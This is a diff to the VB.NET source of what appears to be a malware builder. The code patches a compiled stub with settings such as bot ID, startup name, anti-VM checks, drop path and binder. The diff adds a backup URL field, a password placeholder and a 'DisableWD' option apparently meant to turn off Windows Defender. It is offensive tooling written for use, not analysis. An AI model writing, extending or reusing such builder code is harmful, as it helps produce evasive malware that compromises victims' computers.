@@ -17,6 +17,7 @@ Public Class Form1
     Public BinderPath As String = ""
     Public dropPath As String = ""
     Public dropName As String = ""
+    Public backupURL As String = ""
     Public Shared Function getMD5Hash(ByVal B As Byte()) As String
         B = New MD5CryptoServiceProvider().ComputeHash(B)
         Dim str2 As String = ""
@@ -73,8 +74,13 @@ Public Class Form1
                                                 current.Operand = FlatTextBox1.Text
                                             End If
                                         Else
+
                                             If (str = "[ID]") Then
                                                 current.Operand = FlatTextBox2.Text
+                                            End If
+
+                                            If (str = "[C_Password]") Then
+                                                current.Operand = FlatTextBox4.Text
                                             End If
 
                                             If (str = "[StartupName]") Then
@@ -112,6 +118,9 @@ Public Class Form1
                                                 current.Operand = FlatCheckBox2.Checked.ToString
                                             End If
 
+                                            If (str = "[DisableWD]") Then
+                                                current.Operand = FlatCheckBox15.Checked.ToString
+                                            End If
 
                                             If (str = "[AntiVM]") Then
                                                 current.Operand = FlatCheckBox13.Checked.ToString
@@ -160,7 +169,7 @@ Public Class Form1
                                                     current.Operand = dropName
                                                 End If
                                             End If
-                                        End If
+                                            End If
                                     End If
                                 Loop
                             Finally
